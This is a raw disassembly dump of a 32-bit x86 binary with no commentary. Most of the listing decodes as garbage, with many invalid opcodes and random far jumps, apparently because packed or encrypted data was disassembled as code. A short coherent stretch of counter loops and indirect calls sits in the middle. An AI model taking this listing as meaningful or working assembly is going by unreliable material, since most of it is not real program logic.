  4095e8:	sbb    DWORD PTR [esi+ecx*1],0x9ea2d949
  4095ef:	jns    0x4095ea
  4095f1:	aam    0xd0
  4095f3:	cmp    DWORD PTR [edi-0x39cbf607],eax
  4095f9:	push   cs
  4095fa:	popf   
  4095fb:	add    esi,DWORD PTR [ecx-0x1eb9a5b1]
  409601:	(bad)  
  409602:	jecxz  0x4095c7
  409604:	outs   dx,BYTE PTR ds:[esi]
  409605:	aam    0xad
  409607:	call   0x4744d160
  40960c:	stc    
  40960d:	shr    BYTE PTR [eax+0x355e68ef],cl
  409613:	icebp  
  409614:	js     0x40968b
  409616:	iret   
  409617:	add    al,0xe
  409619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40961a:	mov    WORD PTR [esi+0x5e],ss
  40961d:	arpl   WORD PTR [esi],si
  40961f:	jns    0x4095a4
  409621:	xchg   ebx,eax
  409622:	fcomp  st(6)
  409624:	cli    
  409625:	out    dx,al
  409626:	jp     0x4095c5
  409628:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409629:	bound  edi,QWORD PTR [edx+esi*1-0x2a]
  40962d:	xchg   edx,eax
  40962e:	enterw 0xb42c,0xde
  409633:	sub    bl,bh
  409635:	ror    esp,0x47
  409638:	fwait
  409639:	test   DWORD PTR [eax+edi*4-0xa],esp
  40963d:	lahf   
  40963e:	je     0x409694
  409640:	ja     0x409694
  409642:	test   DWORD PTR [edx+0x69],esp
  409645:	jb     0x4095cb
  409647:	jnp    0x4095f8
  409649:	in     al,0x92
  40964b:	sti    
  40964c:	nop
  40964d:	(bad)
  409651:	in     eax,0xc2
  409653:	mov    al,0x69
  409655:	adc    eax,0xf2bef5c
  40965a:	pop    ecx
  40965b:	cli    
  40965c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40965d:	adc    eax,0xab1037b
  409662:	xor    ch,BYTE PTR [edx+0x6ba41eba]
  409668:	lods   al,BYTE PTR ds:[esi]
  409669:	add    ebx,DWORD PTR [esi+0x5d9b3144]
  40966f:	adc    eax,0xe8a96e11
  409674:	mov    ds:0x986e0979,al
  409679:	or     ecx,0xffffffdb
  40967c:	leave  
  40967d:	mov    edi,0xb90cc3c9
  409682:	dec    ecx
  409683:	dec    esi
  409684:	stos   BYTE PTR es:[edi],al
  409685:	stos   DWORD PTR es:[edi],eax
  409686:	mov    ebx,0x62b17d9e
  40968b:	ja     0x409693
  40968d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40968e:	jle    0x40970e
  409690:	and    DWORD PTR [eax-0x11],ebp
  409693:	sbb    ebx,0xffffff8a
  409696:	mov    esi,0xb9daafc5
  40969b:	rcl    bh,cl
  40969d:	adc    edx,DWORD PTR cs:[ebp-0x52]
  4096a1:	mov    ds:0x1c601312,al
  4096a6:	imul   edi,ebp,0xffffff9b
  4096a9:	mov    ebx,0x7759a81f
  4096ae:	mov    eax,ds:0x6c920feb
  4096b3:	in     eax,dx
  4096b4:	sub    al,BYTE PTR [edi]
  4096b6:	out    dx,eax
  4096b7:	sbb    esp,esi
  4096b9:	xchg   BYTE PTR [ecx],bl
  4096bb:	and    BYTE PTR [ecx],cl
  4096bd:	jmp    0x90f35ac8
  4096c2:	sar    BYTE PTR [esp+ecx*1-0x74eef88a],cl
  4096c9:	xchg   ecx,eax
  4096ca:	add    DWORD PTR [eax+0x5a],edi
  4096cd:	ja     0x409710
  4096cf:	std    
  4096d0:	sbb    bl,BYTE PTR [edx+0x2bd577c7]
  4096d6:	push   eax
  4096d7:	pop    edx
  4096d8:	das    
  4096d9:	adc    ebx,DWORD PTR [ebx-0x5274f968]
  4096df:	push   ds
  4096e0:	(bad)  
  4096e1:	mov    ch,0x89
  4096e3:	outs   dx,DWORD PTR ds:[esi]
  4096e4:	(bad)  
  4096e5:	loop   0x4096aa
  4096e7:	in     eax,dx
  4096e8:	popf   
  4096e9:	neg    DWORD PTR [edi+0x8]
  4096ec:	jmp    0x4183:0x1ac6fee7
  4096f3:	cdq    
  4096f4:	mov    eax,ds:0x67f91fe2
  4096f9:	jmp    0x7d65ad8d
  4096fe:	shl    BYTE PTR [ebx+0x19],1
  409701:	xchg   esi,eax
  409702:	push   ss
  409703:	out    dx,al
  409704:	or     eax,0x45b58b02
  409709:	stos   DWORD PTR es:[edi],eax
  40970a:	add    dh,BYTE PTR [ecx-0x74d0f206]
  409710:	int    0xf4
  409712:	inc    ecx
  409713:	popa   
  409714:	imul   DWORD PTR [ecx]
  409716:	mov    al,0xc9
  409718:	call   0xee1568ed
  40971d:	xchg   dl,dl
  40971f:	mov    dh,0x93
  409721:	into   
  409722:	outs   dx,BYTE PTR ds:[esi]
  409723:	pusha  
  409724:	leave  
  409725:	into   
  409726:	push   ebx
  409727:	xchg   ebp,eax
  409728:	cmc    
  409729:	push   ebx
  40972a:	ud0    edi,DWORD PTR [ebx-0x157bbc96]
  409731:	or     ebp,DWORD PTR [esi+0x35fa04d5]
  409737:	fcomp  QWORD PTR [ebx-0x13]
  40973a:	dec    eax
  40973b:	daa    
  40973c:	mov    eax,0x99b63a2d
  409741:	mov    eax,0xc9695987
  409746:	test   DWORD PTR [ebp+0x49],eax
  409749:	push   ecx
  40974a:	inc    ebp
  40974b:	(bad)  
  40974c:	jmp    0x105:0xd2017eae
  409753:	pop    ds
  409754:	mov    esp,0xff520d89
  409759:	leave  
  40975a:	rol    DWORD PTR [edi+edx*1],cl
  40975d:	cdq    
  40975e:	imul   ecx,DWORD PTR [ecx],0x53
  409761:	and    bl,BYTE PTR [edx+0x89b73f3]
  409767:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409768:	es jnp 0x4097df
  40976b:	cmp    al,0xc6
  40976d:	adc    eax,0x4a81641c
  409772:	add    BYTE PTR [edi],al
  409774:	jb     0x4097d2
  409776:	call   0x8e826324
  40977b:	lock int 0xe3
  40977e:	mov    edi,0xaa26fe33
  409783:	(bad)  
  409784:	mov    ds:0x76423f64,eax
  409789:	xor    bl,0x4
  40978c:	pop    edi
  40978d:	jmp    0x60e4:0xe40d9b3b
  409794:	outs   dx,DWORD PTR ds:[esi]
  409795:	or     al,bl
  409797:	mov    ebp,0x8710c65b
  40979c:	mov    ah,0x8
  40979e:	mov    ebp,DWORD PTR [edi-0x6053ef5d]
  4097a4:	xchg   edi,eax
  4097a5:	cmp    bh,BYTE PTR [esi-0x7d]
  4097a8:	add    BYTE PTR [ebx-0x32],ch
  4097ab:	mov    cl,0x24
  4097ad:	push   esp
  4097ae:	cwde   
  4097af:	xor    BYTE PTR [esi],ah
  4097b1:	popf   
  4097b2:	ins    BYTE PTR es:[edi],dx
  4097b3:	clc    
  4097b4:	cmp    DWORD PTR [esi+0x441d95f5],esp
  4097ba:	(bad)  
  4097bc:	rcr    BYTE PTR [ebx],0xb4
  4097bf:	pop    ebp
  4097c0:	push   esp
  4097c1:	jp     0x40980c
  4097c3:	outs   dx,BYTE PTR ds:[esi]
  4097c4:	sahf   
  4097c5:	cmp    DWORD PTR [ecx+0x60],esi
  4097c8:	add    bl,BYTE PTR [edx]
  4097ca:	xchg   esp,eax
  4097cb:	lea    esi,[edi-0x519cc4b]
  4097d1:	push   0xc99b07be
  4097d6:	cld    
  4097d7:	mov    ebx,0xf7a10a69
  4097dc:	cs hlt 
  4097de:	push   esp
  4097df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097e0:	mov    eax,0xb4df9e47
  4097e5:	push   es
  4097e6:	out    dx,al
  4097e7:	push   es
  4097e8:	xchg   edx,eax
  4097e9:	int3   
  4097ea:	loopne 0x409837
  4097ec:	stos   DWORD PTR es:[edi],eax
  4097ed:	fisttp QWORD PTR [edi+edx*1-0x608449db]
  4097f4:	push   ebp
  4097f5:	rcr    DWORD PTR gs:[ebx+0x634f9318],0x1
  4097fd:	mov    cs,WORD PTR [ebp+0x4970014b]
  409803:	mov    ?,WORD PTR [ebp+0x7e]
  409806:	push   edx
  409807:	lea    ebp,ds:0x459f8901
  40980d:	fisubr WORD PTR [edi+0x36]
  409810:	out    dx,eax
  409811:	fwait
  409812:	xchg   ebp,eax
  409813:	fiadd  DWORD PTR [edi-0x6a]
  409816:	js     0x409851
  409818:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409819:	mov    ebx,?
  40981b:	or     ah,BYTE PTR [ebx+0x2055cbdf]
  409821:	dec    edx
  409822:	bound  edx,QWORD PTR [eax-0x55078947]
  409828:	inc    ebx
  409829:	fnsave [eax-0x31e66ac]
  40982f:	call   0xeb6e684f
  409834:	(bad)  
  409836:	push   ss
  409837:	push   es
  409838:	dec    esp
  409839:	stos   BYTE PTR es:[edi],al
  40983a:	rcl    DWORD PTR [edi+0x6d],0xc0
  40983e:	dec    eax
  40983f:	retf   0xed69
  409842:	mov    al,0x9f
  409844:	mov    WORD PTR [esi],es
  409846:	pushf  
  409847:	inc    eax
  409848:	cld    
  409849:	test   al,0x2f
  40984b:	shl    ah,0x1f
  40984e:	push   cs
  40984f:	aam    0x9f
  409851:	sbb    al,0x78
  409853:	jmp    0x63d4226e
  409858:	push   eax
  409859:	hlt    
  40985a:	push   edi
  40985b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40985c:	ucomiss xmm5,DWORD PTR [eax+0x5b]
  409860:	hlt    
  409861:	outs   dx,BYTE PTR ds:[esi]
  409862:	popf   
  409863:	cwde   
  409864:	sub    esi,DWORD PTR [ecx-0x7fc07b16]
  40986a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40986b:	shl    dl,cl
  40986d:	dec    esi
  40986e:	pavgw  mm7,mm1
  409871:	sbb    dh,dh
  409873:	ds in  al,0x91
  409876:	mov    edx,0x327a9edd
  40987b:	repnz pop esi
  40987d:	cli    
  40987e:	pop    esi
  40987f:	into   
  409880:	inc    ebx
  409881:	jecxz  0x4098a2
  409883:	test   eax,0x68266d43
  409888:	(bad)  
  409889:	call   DWORD PTR [eax+0x11]
  40988c:	fcmovne st,st(0)
  40988e:	pop    edx
  40988f:	imul   ecx,DWORD PTR [edi],0x48178923
  409895:	add    ah,0xba
  409898:	push   eax
  409899:	push   edx
  40989a:	dec    ecx
  40989b:	mov    bh,0x82
  40989d:	div    DWORD PTR [ecx+eiz*2]
  4098a0:	lahf   
  4098a1:	test   BYTE PTR [ebx-0xe2a6f72],ah
  4098a7:	push   edi
  4098a8:	ret    
  4098a9:	loop   0x409910
  4098ab:	ror    DWORD PTR [eax],cl
  4098ad:	popa   
  4098ae:	data16 jle 0x409926
  4098b1:	test   BYTE PTR [esi-0x31],dh
  4098b4:	(bad)  
  4098b6:	ret    
  4098b7:	sbb    al,0xc3
  4098b9:	pop    esi
  4098ba:	pop    edx
  4098bb:	dec    edx
  4098bc:	outs   dx,BYTE PTR ds:[esi]
  4098bd:	add    dl,al
  4098bf:	push   ebp
  4098c0:	outs   dx,BYTE PTR ds:[esi]
  4098c1:	dec    eax
  4098c2:	add    al,BYTE PTR [eax+0x35058919]
  4098c8:	arpl   WORD PTR [edi+0x5c],cx
  4098cb:	jb     0x4098e8
  4098cd:	cwde   
  4098ce:	into   
  4098cf:	(bad)  
  4098d0:	adc    ah,ch
  4098d2:	test   bl,bl
  4098d4:	xor    BYTE PTR gs:[ebp+eax*2+0x4961428e],0x2a
  4098dd:	xchg   edi,eax
  4098de:	mov    ds:0xc9b70f87,al
  4098e3:	sbb    DWORD PTR ds:0x43373b,0x5a23
  4098ed:	add    ecx,DWORD PTR [eax]
  4098ef:	adc    DWORD PTR ds:0x4336a7,ebx
  4098f5:	mov    DWORD PTR [ebp-0x18],ecx
  4098f8:	and    eax,DWORD PTR ds:0x433637
  4098fe:	mov    eax,DWORD PTR [ebp+0x8]
  409901:	and    DWORD PTR ds:0x43366f,0x0
  40990b:	mov    ecx,DWORD PTR ds:0x43366f
  409911:	inc    ecx
  409912:	mov    DWORD PTR ds:0x43366f,ecx
  409918:	cmp    DWORD PTR ds:0x43366f,0x2e
  40991f:	jne    0x409933
  409925:	push   DWORD PTR [ebp-0x24]
  409928:	push   0x2be2
  40992d:	call   DWORD PTR ds:0x41201c
  409933:	cmp    DWORD PTR ds:0x43366f,0x1f
  40993a:	jb     0x40990b
  409940:	mov    DWORD PTR ds:0x4336a7,0x11
  40994a:	cmp    DWORD PTR ds:0x4336a7,0x0
  409951:	je     0x4099a3
  409957:	cmp    DWORD PTR ds:0x4336a7,0x6
  40995e:	jne    0x409977
  409964:	push   0x4337a4
  409969:	push   DWORD PTR [ebp-0x24]
  40996c:	push   0x64fc
  409971:	call   DWORD PTR ds:0x4121d0
  409977:	cmp    DWORD PTR ds:0x4336a7,0x7
  40997e:	jne    0x409991
  409984:	mov    ecx,DWORD PTR ds:0x4336a7
  40998a:	dec    ecx
  40998b:	mov    DWORD PTR ds:0x4336a7,ecx
  409991:	mov    ecx,DWORD PTR ds:0x4336a7
  409997:	dec    ecx
  409998:	mov    DWORD PTR ds:0x4336a7,ecx
  40999e:	jmp    0x40994a
  4099a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4099a6:	xor    eax,esi
  4099a8:	add    eax,edi
  4099aa:	cmp    DWORD PTR [ecx],eax
  4099ac:	jmp    0x409ccd
  4099b1:	cmovbe ebx,DWORD PTR [esi+0x55e577e5]
  4099b8:	je     0x4099d6
  4099ba:	dec    edi
  4099bb:	cmc    
  4099bc:	fnsave [edx]
  4099be:	rol    BYTE PTR [ebp+0x62],1
  4099c1:	push   0x7a7e7ee4
  4099c6:	jge    0x409a46
  4099c8:	jle    0x4099c9
  4099ca:	ss or  al,0xe1
  4099cd:	sti    
  4099ce:	retf   
  4099cf:	mov    al,ds:0x921d2dba
  4099d4:	shl    BYTE PTR [eax*1-0x58473043],1
  4099db:	mov    DWORD PTR ds:0x89f6ed98,edi
  4099e1:	cmp    BYTE PTR [edi],cl
  4099e3:	jo     0x409a4f
  4099e5:	xchg   DWORD PTR [ebx+0x6c3688b1],esi
  4099eb:	jmp    0x409990
  4099ed:	xlat   BYTE PTR ds:[ebx]
  4099ee:	mov    bh,0xb7
  4099f0:	push   es
  4099f1:	out    dx,eax
  4099f2:	jno    0x409a41
  4099f4:	scas   al,BYTE PTR es:[edi]
  4099f5:	mov    ds:0xcee748dd,al
  4099fa:	sbb    DWORD PTR [edi+0x5ea0cb67],edi
  409a00:	pop    esp
  409a01:	xchg   esi,eax
  409a02:	mov    BYTE PTR [eax],0x99
  409a05:	mov    ebp,0xa96100a2
  409a0a:	call   0xfca4220
  409a0f:	mov    dh,0xe2
  409a11:	cmp    eax,0xe6fa75bc
  409a16:	cmp    bh,al
  409a18:	repz jb 0x409a84
  409a1b:	inc    esp
  409a1c:	outs   dx,BYTE PTR ds:[esi]
  409a1d:	loop   0x409a6f
  409a1f:	sbb    DWORD PTR [ebp-0x4c442c06],esi
  409a25:	mov    al,bh
  409a27:	(bad)  
  409a28:	retf   0xdeaf
  409a2b:	mov    WORD PTR [edx+0x38344bc9],gs
  409a31:	xor    BYTE PTR [ebx+0x79b7b3c4],cl
  409a37:	call   0x95f1:0x82c2dd84
  409a3e:	je     0x409a1f
  409a40:	sbb    ebx,DWORD PTR [eax+0x3b5b6950]
  409a46:	push   esp
  409a47:	jne    0x409a3d
  409a49:	xor    edx,esi
  409a4b:	jbe    0x4099eb
  409a4d:	ds mov bh,0xe0
  409a50:	mov    ds:0xcef0f54c,eax
  409a55:	addr16 mov eax,0x42bc596
  409a5b:	in     eax,dx
  409a5c:	test   eax,0x5419649f
  409a61:	or     BYTE PTR [eiz*8+0xecc7080],bh
  409a68:	imul   esp,DWORD PTR [ecx+0x6b],0x29
  409a6c:	sbb    DWORD PTR [esi-0x63],eax
  409a6f:	jge    0x409a33
  409a71:	je     0x409a32
  409a73:	in     eax,dx
  409a74:	shr    BYTE PTR [edi+0x15ee9972],cl
  409a7a:	fadd   st(7),st
  409a7c:	pop    ebx
  409a7d:	fisubr DWORD PTR [ebx]
  409a7f:	pop    ebx
  409a80:	jge    0x409a8e
  409a82:	shl    DWORD PTR [esi+eiz*2],cl
  409a85:	jnp    0x409a15
  409a87:	ficomp DWORD PTR [edi+0x44]
  409a8a:	xchg   esi,eax
  409a8b:	dec    eax
  409a8c:	popf   
  409a8d:	xchg   ebp,eax
  409a8e:	sbb    DWORD PTR [ecx],eax
  409a90:	jge    0x409a30
  409a92:	jo     0x409a64
  409a94:	stos   BYTE PTR es:[edi],al
  409a95:	(bad)  [ebp+0x5d]
  409a98:	aas    
  409a99:	pop    edi
  409a9a:	dec    ecx
  409a9b:	fld    DWORD PTR [eax-0x6d4fe996]
  409aa1:	dec    ebp
  409aa2:	adc    DWORD PTR [ebx-0x9befc51],esp
  409aa8:	add    BYTE PTR [ebp+0x3e],al
  409aab:	mov    eax,ds:0xf6c593b3
  409ab0:	mov    edx,0xd1538318
  409ab5:	push   es
  409ab6:	(bad)  
  409ab7:	imul   ebx,DWORD PTR [edx-0x76],0x63
  409abb:	push   esp
  409abc:	pop    edx
  409abd:	push   ds
  409abe:	pop    esp
  409abf:	adc    al,0x6d
  409ac1:	fcomip st,st(1)
  409ac3:	inc    ebp
  409ac4:	fiadd  DWORD PTR [eax]
  409ac6:	mov    esp,0xff3e0348
  409acb:	add    al,0xaa
  409acd:	push   cs
  409ace:	loop   0x409a9a
  409ad0:	daa    
  409ad1:	inc    esp
  409ad2:	dec    edx
  409ad3:	pop    ecx
  409ad4:	and    al,0x95
  409ad6:	and    ecx,ecx
  409ad8:	rcl    BYTE PTR [esi],0xdb
  409adb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409adc:	repz push ebp
  409ade:	adc    eax,0x9c5421ac
  409ae3:	outs   dx,DWORD PTR ds:[esi]
  409ae4:	nop
  409ae5:	jmp    0x409b07
  409ae7:	inc    eax
  409ae8:	add    al,0xb
  409aea:	nop
  409aeb:	add    al,0x65
  409aed:	push   0x7ef27450
  409af2:	xchg   esp,eax
  409af3:	shl    DWORD PTR [ebp-0x2e],cl
  409af6:	ret    0x8d40
  409af9:	ret    
  409afa:	cmp    DWORD PTR [edi],esi
  409afc:	pusha  
  409afd:	xchg   DWORD PTR [eax+ebx*4],edi
  409b00:	ins    BYTE PTR es:[edi],dx
  409b01:	pop    esp
  409b02:	loop   0x409b48
  409b04:	cmp    ch,dl
  409b06:	push   eax
  409b07:	cli    
  409b08:	mov    edx,0xd5c723ae
  409b0d:	sti    
  409b0e:	xor    al,0x3d
  409b10:	test   BYTE PTR [ebp+0x14620ccf],dh
  409b16:	repnz test DWORD PTR [edi],eax
  409b19:	test   DWORD PTR [ebx-0x71],edi
  409b1c:	sbb    DWORD PTR [ecx+eax*8],ebx
  409b1f:	xlat   BYTE PTR ds:[ebx]
  409b20:	jo     0x409b2f
  409b22:	jle    0x409b6d
  409b24:	and    ah,BYTE PTR [edx]
  409b26:	dec    esp
  409b27:	loop   0x409aab
  409b29:	shl    esi,1
  409b2b:	xor    ecx,eax
  409b2d:	xchg   ebp,eax
  409b2e:	imul   eax,edi,0x24
  409b31:	adc    dh,ah
  409b33:	retw   0x2ee3
  409b37:	cmp    BYTE PTR ds:0xfe3cae8c,ah
  409b3d:	in     al,0x6d
  409b3f:	aaa    
  409b40:	adc    al,0xf9
  409b42:	mov    ecx,0x5677cd6f
  409b47:	sar    eax,0x6
  409b4a:	rcl    BYTE PTR [ecx-0x77fcfa54],cl
  409b50:	shl    BYTE PTR [esi-0x43bb1478],0xde
  409b57:	push   cs
  409b58:	push   eax
  409b59:	add    bl,BYTE PTR [ecx-0x2fa69a5]
  409b5f:	(bad)  [ecx-0x4b]
  409b62:	adc    al,0xa9
  409b64:	int3   
  409b65:	fcom   QWORD PTR [esi-0x215113a8]
  409b6b:	push   edx
  409b6c:	pop    edi
  409b6d:	jbe    0x409b94
  409b6f:	clc    
  409b70:	mov    WORD PTR [eax+0x26],cs
  409b73:	jmp    0x3a73:0x9101adb3
  409b7a:	ficom  WORD PTR [esi+0x6866086]
  409b80:	clc    
  409b81:	fs shl eax,cl
  409b84:	test   eax,0x917ad376
  409b89:	cmc    
  409b8a:	sbb    bh,BYTE PTR [esi-0x3704fd7d]
  409b90:	adc    eax,0x88546537
  409b95:	aaa    
  409b96:	(bad)  
  409b97:	mov    ds:0x19ca51f4,al
  409b9c:	leave  
  409b9d:	inc    esi
  409b9e:	loop   0x409bf0
  409ba0:	(bad)  
  409ba2:	imul   ebx,DWORD PTR [edi],0xcd817971
  409ba8:	and    al,0xf1
  409baa:	or     DWORD PTR [edi+eax*1-0x49b140ab],eax
  409bb1:	cmp    al,0x58
  409bb3:	adc    eax,0x49d3051c
  409bb8:	jns    0x409bc6
  409bba:	add    al,0x5d
  409bbc:	(bad)
  409bbf:	dec    ecx
  409bc0:	and    eax,0xbf4d1586
  409bc5:	cmp    BYTE PTR [eax+0x9418499],al
  409bcb:	jo     0x409c1b
  409bcd:	xor    DWORD PTR ds:0xf47e2079,edi
  409bd3:	jmp    0xfe3:0x88afdf38
  409bda:	lea    eax,[esi+0x28aaef15]
  409be0:	test   DWORD PTR [eax-0x28],0xb3e944c7
  409be7:	dec    ebp
  409be8:	push   ebp
  409be9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bea:	jb     0x409ba3
  409bec:	cmp    eax,0xa6640f78
  409bf1:	in     eax,0x4a
  409bf3:	push   0x4b0d711f
  409bf8:	dec    edi
  409bf9:	sub    bl,BYTE PTR [edx-0x4a335c96]
  409bff:	mov    ebx,0xcff00339
  409c04:	cli    
  409c05:	neg    BYTE PTR ds:0xd42d2493
  409c0b:	mov    edx,0x6f875601
  409c10:	xor    eax,0x6f074d71
  409c15:	ret    0xe9ca
  409c18:	mov    eax,ds:0x4afc4efe
  409c1d:	push   ebp
  409c1e:	inc    ebx
  409c1f:	aas    
  409c20:	add    eax,0x42bb3392
  409c25:	je     0x409c0a
  409c27:	mov    bl,BYTE PTR [edx-0x62e4c32e]
  409c2d:	loop   0x409c2a
  409c2f:	cmc    
  409c30:	ret    
  409c31:	dec    ebp
  409c32:	fisubr DWORD PTR [edx-0x7e]
  409c35:	(bad)  
  409c36:	mov    ah,0xb5
  409c38:	lahf   
  409c39:	mov    eax,ds:0xe557708b
  409c3e:	iret   
  409c3f:	mov    edx,DWORD PTR [eax]
  409c41:	shl    DWORD PTR [eax+0x14a729f0],1
  409c47:	push   ebx
  409c48:	sbb    al,0x47
  409c4a:	out    0xab,eax
  409c4c:	xchg   esp,eax
  409c4d:	(bad)  
  409c4e:	retf   
  409c4f:	push   edi
  409c50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c51:	push   ss
  409c52:	js     0x409c5b
  409c54:	or     bh,BYTE PTR [edi-0x6c]
  409c57:	cmp    DWORD PTR [eax],esp
  409c59:	rol    DWORD PTR [edi-0x114f785c],0x6
  409c60:	mov    dl,0x73
  409c62:	loope  0x409c2a
  409c64:	push   ds
  409c65:	les    ebx,FWORD PTR [edx-0xf]
  409c68:	xlat   BYTE PTR ds:[ebx]
  409c69:	inc    ecx
  409c6a:	(bad)  
  409c6b:	aam    0xf
  409c6d:	sbb    ebp,ebp
  409c6f:	enter  0xd2c9,0x78
  409c73:	sbb    cl,BYTE PTR [esi-0x28023161]
  409c79:	and    dl,dh
  409c7b:	aas    
  409c7c:	loopne 0x409cc9
  409c7e:	pop    ds
  409c7f:	retf   0xc12e
  409c82:	and    ecx,DWORD PTR [eax-0x5b]
  409c85:	aaa    
  409c86:	mov    ah,0x2e
  409c88:	(bad)  
  409c89:	(bad)  
  409c8a:	ficom  WORD PTR [eax-0xd8ee6d6]
  409c90:	mov    ch,0x8
  409c92:	pushf  
  409c93:	iret   
  409c94:	sbb    ah,ch
  409c96:	adc    eax,0x217d4212
  409c9b:	xor    DWORD PTR [eax-0x9],0x63
  409c9f:	outs   dx,DWORD PTR ds:[esi]
  409ca0:	jns    0x409cd9
  409ca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ca3:	mov    eax,DWORD PTR [esi+0x5a]
  409ca6:	dec    DWORD PTR [ecx+ecx*1-0x7d]
  409caa:	push   edi
  409cab:	jmp    0xc84c:0x7e7c990d
  409cb2:	in     al,0xf2
  409cb4:	mov    ds:0x4c0d1d56,al
  409cb9:	push   ss
  409cba:	or     BYTE PTR [esi],0x7a
  409cbd:	jl     0x409c65
  409cbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cc0:	xlat   BYTE PTR ds:[ebx]
  409cc1:	dec    edx
  409cc2:	test   BYTE PTR [eax-0x18],0x9a
  409cc6:	jl     0x409c9c
  409cc8:	pop    ss
  409cc9:	enter  0xb805,0x47
  409ccd:	jne    0x40a399
  409cd3:	mov    eax,DWORD PTR [ebp+0x8]
  409cd6:	mov    ecx,DWORD PTR [ebp-0x18]
  409cd9:	xor    eax,esi
  409cdb:	add    eax,edi
  409cdd:	cmp    DWORD PTR [ecx],eax
  409cdf:	jne    0x40a344
  409ce5:	mov    eax,DWORD PTR [ebp+0x8]
  409ce8:	jmp    0x40a009
  409ced:	inc    edi
  409cee:	aad    0xe6
  409cf0:	shl    BYTE PTR [ecx+esi*8+0x71],1
  409cf4:	push   ecx
  409cf5:	out    0xaa,eax
  409cf7:	push   esp
  409cf8:	stc    
  409cf9:	(bad)  
  409cfa:	xor    edi,edx
  409cfc:	add    dh,BYTE PTR [ebx+eiz*8+0x7e]
  409d00:	jle    0x409d7c
  409d02:	jge    0x409d82
  409d04:	jle    0x409d52
  409d06:	adc    BYTE PTR [eax-0x27a15887],cl
  409d0c:	repnz cmc 
  409d0e:	sbb    ch,BYTE PTR [edx]
  409d10:	dec    edi
  409d11:	(bad)  
  409d12:	lods   eax,DWORD PTR ds:[esi]
  409d13:	stos   BYTE PTR es:[edi],al
  409d14:	inc    esp
  409d15:	outs   dx,DWORD PTR ds:[esi]
  409d16:	mov    ebx,0x8f68e45f
  409d1b:	ss test al,0xfd
  409d1e:	fdivrp st(2),st
  409d20:	push   esi
  409d21:	add    DWORD PTR [esp+ebx*2-0x3c],ecx
  409d25:	cs and al,0x18
  409d28:	aas    
  409d29:	xchg   DWORD PTR [edi],esp
  409d2b:	sub    DWORD PTR [edi-0x43c423ee],eax
  409d31:	jne    0x409d08
  409d33:	(bad)  
  409d34:	mov    ch,0x48
  409d36:	sub    ecx,esp
  409d38:	hlt    
  409d39:	xor    DWORD PTR [bx+0x176a],ebx
  409d3e:	or     DWORD PTR [eax],0xfffffff9
  409d41:	dec    eax
  409d42:	fldpi  
  409d44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d45:	and    eax,0x817438a3
  409d4a:	pop    ds
  409d4b:	leave  
  409d4c:	retf   
  409d4d:	mov    al,ds:0x51d39ee8
  409d52:	fisttp DWORD PTR [edx+edi*4+0x6e92189b]
  409d59:	popa   
  409d5a:	cld    
  409d5b:	loope  0x409da3
  409d5d:	or     eax,0x52a94b17
  409d62:	ja     0x409d93
  409d64:	scas   eax,DWORD PTR es:[edi]
  409d65:	ja     0x409d52
  409d67:	lea    ebp,[edx+edi*8]
  409d6a:	lods   eax,DWORD PTR ds:[esi]
  409d6b:	push   ds
  409d6c:	(bad)  
  409d6d:	mov    al,ds:0x943f58c3
  409d72:	test   eax,0x2b299110
  409d77:	mov    ebp,0x64ac15d7
  409d7c:	xchg   ebp,eax
  409d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d7e:	retf   
  409d7f:	dec    esi
  409d80:	pop    edi
  409d81:	arpl   WORD PTR [edx-0x6],cx
  409d84:	push   ecx
  409d85:	popa   
  409d86:	sub    ebx,ebx
  409d88:	jmp    FWORD PTR [ebp+0x52]
  409d8b:	sbb    eax,0x3cd300c4
  409d90:	mov    ebp,0x8b87fe00
  409d95:	xchg   edx,eax
  409d96:	push   0xb70fef1b
  409d9b:	sbb    ebp,DWORD PTR [edi-0x380262cf]
  409da1:	pop    ds
  409da2:	je     0x409dd0
  409da4:	add    dl,BYTE PTR [edi]
  409da6:	inc    ebp
  409da7:	dec    edi
  409da8:	or     eax,0x8429083d
  409dad:	aas    
  409dae:	dec    BYTE PTR [eax-0x3e4e4236]
  409db4:	in     al,dx
  409db5:	dec    eax
  409db6:	in     al,dx
  409db7:	or     ecx,DWORD PTR [edi]
  409db9:	in     al,dx
  409dba:	jecxz  0x409df2
  409dbc:	adc    al,0xc4
  409dbe:	(bad)  
  409dbf:	cdq    
  409dc0:	dec    ebp
  409dc1:	arpl   WORD PTR [ecx+0x7dcba57],bx
  409dc7:	xor    BYTE PTR [edi-0x13],ah
  409dca:	add    edx,DWORD PTR [edx+esi*4-0x11]
  409dce:	es jmp 0xd6b0:0x5384125d
  409dd6:	sub    BYTE PTR [bp+si-0x3d],0xb0
  409ddb:	scas   al,BYTE PTR es:[edi]
  409ddc:	cmp    BYTE PTR [ecx+0x38c00df],0xb6
  409de3:	int    0xbd
  409de5:	xor    eax,0x36421514
  409dea:	dec    ebp
  409deb:	dec    ecx
  409dec:	cmp    eax,DWORD PTR [edx-0x3e]
  409def:	fdiv   DWORD PTR [edx-0x5]
  409df2:	dec    edx
  409df3:	icebp  
  409df4:	jmp    0x409e32
  409df6:	xor    eax,0x34e1f4c5
  409dfb:	or     eax,0xc2f26fe6
  409e00:	gs enter 0xfcd2,0x8f
  409e05:	xchg   edi,eax
  409e06:	push   0xffffffad
  409e08:	mov    ch,0x28
  409e0a:	or     esi,DWORD PTR [esi+esi*1]
  409e0d:	out    0x44,al
  409e0f:	mov    al,ds:0x8a858402
  409e14:	imul   esi,DWORD PTR [ecx+ebp*2],0xb
  409e18:	fist   WORD PTR [edx-0x7a]
  409e1b:	mov    BYTE PTR [ebp-0x1f244e3f],dl
